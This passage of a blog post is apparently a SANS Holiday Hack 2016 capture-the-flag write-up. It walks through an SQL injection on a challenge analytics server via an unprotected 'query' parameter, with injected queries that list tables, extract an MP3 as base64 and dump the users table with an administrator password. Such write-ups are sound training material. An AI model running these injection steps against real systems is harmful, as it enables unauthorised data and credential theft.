+    <span class="s">$type = $_REQUEST['type'];</span>
+    <span class="s">if($type !== 'launch' &amp;&amp; $type !== 'usage') {</span>
+      <span class="s">reply(400, "Type has to be either 'launch' or 'usage'!");</span>
+    <span class="s">}</span>
+
+    <span class="s">$query = "SELECT * ";</span>
+    <span class="s">$query .= "FROM `app_" . $type . "_reports` ";</span>
+    <span class="s">$query .= "WHERE " . join(' AND ', $where) . " ";</span>
+    <span class="s">$query .= "LIMIT 0, 100";</span>
+
+    <span class="s">if(isset($_REQUEST['save'])) {</span>
+      <span class="s">$id = gen_uuid();</span>
+      <span class="s">$name = "report-$id";</span>
+      <span class="s">$description = "Report generated @ " . date('Y-m-d H:i:s');</span>
+      <span class="s">$result = mysqli_query($db, "INSERT INTO `reports`</span>
+        <span class="s">(`id`, `name`, `description`, `query`)</span>
+      <span class="s">VALUES</span>
+        <span class="s">('$id', '$name', '$description', '" . mysqli_real_escape_string($db, $query) . "')</span>
+        <span class="s">");</span>
+
+      <span class="s">if(!$result) {</span>
+        <span class="s">reply(500, "Error saving report</span><span class="pi">:</span> <span class="s2">"</span><span class="nv"> </span><span class="s">.</span><span class="nv"> </span><span class="s">mysqli_error($db));</span>
+        <span class="s">die();</span>
+      <span class="s">}</span>
+<span class="s">&lt;!--OUTPUT</span><span class="nv"> </span><span class="s">TRUNCATED--&gt;</span>
+</code></pre></div></div>
+<p>See the issue?  There is another parameter being passed called <code class="highlighter-rouge">$query</code> and it doesn’t have the same protections that the other fields do.  Plus, it’s being stored in <code class="highlighter-rouge">$results</code>.</p>
+
+<p>Remember that I have a query saved with an <code class="highlighter-rouge">$id</code> number already assigned.  Next, head over to the unlocked Edit page, enter the ID (14ee7e28-9835-4fe6-a3f4-e4d4127d0d22), the name and description fields can be blank. Finally, capture that request in a proxy…</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup4.png" alt="sqli_setup5" /></p>
+
+<p>Add <code class="highlighter-rouge">&amp;query=SHOW TABLES;</code> to the HTTP GET request and forward the request…</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup5.png" alt="sqli_setup6" /></p>
+
+<p>The query string has been saved successfully.  To view the results, head to the View page.</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup6.png" alt="sqli_setup6" /></p>
+
+<p>Enter the saved ID number one more time…</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup7.png" alt="sqli_setup6" /></p>
+
+<p>Now I can see the tables inside the database.  Time to dig deeper and enter different commands to read more data from the database.</p>
+
+<p><img src="/assets/images/sans2016/sqli_setup8.png" alt="sqli_setup6" /></p>
+
+<p>Repeate the steps above with <code class="highlighter-rouge">&amp;query=SELECT * FROM audio;</code></p>
+
+<p><img src="/assets/images/sans2016/sqli_setup9.png" alt="sqli_setup6" /></p>
+
+<p>The audio file name is disclosed but how to download it?  Let’s think about this, it is possible to query and display text.  Why not try to convert the file to text? Base64 to the rescue!</p>
+
+<p><code class="highlighter-rouge">&amp;query=SELECT id, filename, TO_BASE64(mp3) FROM audio WHERE filename='discombobulatedaudio7.mp3';</code></p>
+
+<p><img src="/assets/images/sans2016/sqli_setup10.png" alt="sqli_setup6" /></p>
+
+<p>Copy the wall of text (the base64 encoded MP3 file), save it to a text file, and decode it locally.</p>
+
+<p><code class="highlighter-rouge">josh@MacBook-Pro /$ cat base64_encoded_audio.txt | base64 -D &gt; discombobulatedaudio7.mp3</code></p>
+
+<p>That’s it.</p>
+
+<p>One last fun thing is to see what the administrator’s password is in cleartext, because, why not? <code class="highlighter-rouge">&amp;query=SELECT * FROM users;</code></p>
+
+<p><img src="/assets/images/sans2016/sqli_setup11.png" alt="sqli_setup6" /></p>
+
+<p class="notice">What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Number</th>
+      <th style="text-align: center">Target</th>
+      <th style="text-align: center">File Name</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">1</td>
+      <td style="text-align: center">The Mobile Analytics Server (via credentialed login access)</td>
+      <td style="text-align: center"><a href="/assets/files/discombobulatedaudio2.mp3">discombobulatedaudio2.mp3</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">2</td>
+      <td style="text-align: center">The Mobile Analytics Server (post authentication)</td>
+      <td style="text-align: center"><a href="/assets/files/discombobulatedaudio7.mp3">discombobulatedaudio7.mp3</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3</td>
+      <td style="text-align: center">The Dungeon Game</td>
+      <td style="text-align: center"><a href="/assets/files/discombobulatedaudio3.mp3">discombobulatedaudio3.mp3</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">4</td>
+      <td style="text-align: center">The Debug Server</td>
+      <td style="text-align: center"><a href="/assets/files/debug-20161224235959-0.mp3">debug-20161224235959-0.mp3</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">5</td>
+      <td style="text-align: center">The Banner Ad Server</td>
+      <td style="text-align: center"><a href="/assets/files/discombobulatedaudio5.mp3">discombobulatedaudio5.mp3</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">6</td>
+      <td style="text-align: center">The Uncaught Exception Handler Server</td>
+      <td style="text-align: center"><a href="/assets/files/discombobulated-audio-6-XyzE3N9YqKNH.mp3">discombobulated-audio-6-XyzE3N9YqKNH.mp3</a></td>
+    </tr>
+    <tr>
+      <td style="text-align: left">7</td>
+      <td style="text-align: center">The SantaGram APK</td>
+      <td style="text-align: center"><a href="/assets/files/discombobulatedaudio1.mp3">discombobulatedaudio1.mp3</a></td>
+    </tr>
+  </tbody>
+</table>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#holday-hack" class="page__taxonomy-item" rel="tag">Holday Hack</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#sans" class="page__taxonomy-item" rel="tag">SANS</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#writeup" class="page__taxonomy-item" rel="tag">writeup</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2016-03-06">March 06, 2016</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=jtomkiel&text=Part+4%3A+My+Gosh...+It%27s+Full+of+Holes%20http%3A%2F%2Flocalhost%3A4000%2Fsans%2Fholday%2520hack%2Fwriteup%2Fsans-holiday-hack-challenge-pt4-2016%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fsans%2Fholday%2520hack%2Fwriteup%2Fsans-holiday-hack-challenge-pt4-2016%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2Flocalhost%3A4000%2Fsans%2Fholday%2520hack%2Fwriteup%2Fsans-holiday-hack-challenge-pt4-2016%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fsans%2Fholday%2520hack%2Fwriteup%2Fsans-holiday-hack-challenge-pt4-2016%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt3-2016/" class="pagination--pager" title="Part 3: A Fresh-Baked Holiday Pi
+">Previous</a>
+    
+    
+      <a href="/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt5-2016/" class="pagination--pager" title="Part 5: Discombobulated Audio
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/500x300.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/research/research-project1-2018/" rel="permalink">Research Project 1
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  less than 1 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">Coming soon…
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/sans-2016.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/sans/holday%20hack/writeup/sans-holiday-hack-terminals-2016/" rel="permalink">Terminals
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  16 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">SANS Holiday Hack 2016 Writeup - The Terminals
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/sans-2016.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt5-2016/" rel="permalink">Part 5: Discombobulated Audio
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  1 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">SANS Holiday Hack 2016 Writeup - The Challenges - Part 5
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src=
+          
+            "/assets/images/sans-2016.png"
+          
+          alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt3-2016/" rel="permalink">Part 3: A Fresh-Baked Holiday Pi
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 minute read
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">SANS Holiday Hack 2016 Writeup - The Challenges - Part 3
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><div class="search-searchbar"></div>
+    <div class="search-hits"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+      <li><a href="https://twitter.com/jtomkiel"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Josh Tomkiel. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.13/js/all.js"></script>
+
+
+<!-- Including InstantSearch.js library and styling -->
+<script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.3.3/dist/instantsearch.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.3.3/dist/instantsearch.min.css">
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.3.3/dist/instantsearch-theme-algolia.min.css">
+
+<script>
+// Instanciating InstantSearch.js with Algolia credentials
+const search = instantsearch({
+  appId: '',
+  apiKey: '',
+  indexName: '',
+  searchParameters: {
+    restrictSearchableAttributes: [
+      'title',
+      'content'
+    ]
+  }
+});
+
+const hitTemplate = function(hit) {
+  const url = hit.url;
+  const title = hit._highlightResult.title.value;
+  const content = hit._highlightResult.html.value;
+
+  return `
+    <div class="list__item">
+      <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+        <h2 class="archive__item-title" itemprop="headline"><a href="${url}">${title}</a></h2>
+        <div class="archive__item-excerpt" itemprop="description">${content}</div>
+      </article>
+    </div>
+  `;
+}
+
+// Adding searchbar and results widgets
+search.addWidget(
+  instantsearch.widgets.searchBox({
+    container: '.search-searchbar',
+    poweredBy: true,
+    placeholder: 'Enter your search term...'
+  })
+);
+search.addWidget(
+  instantsearch.widgets.hits({
+    container: '.search-hits',
+    templates: {
+      item: hitTemplate
+    }
+  })
+);
+
+// Starting the search
+search.start();
+</script>
+
+
+
+
+
+  </body>
+</html>
